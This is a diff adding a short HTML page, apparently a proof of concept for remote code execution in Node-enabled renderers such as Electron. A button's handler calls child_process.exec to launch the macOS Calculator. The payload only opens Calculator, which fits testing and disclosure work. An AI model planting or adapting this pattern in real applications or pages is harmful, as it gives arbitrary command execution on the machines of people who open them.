@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<h1>Click me!</h1>
+<button type="button" onClick="rce_calc_macos()">Submit</button>
+<script>
+  function rce_calc_macos(){
+  const { exec } = require('child_process');
+  exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator'); 
+}
+</script>
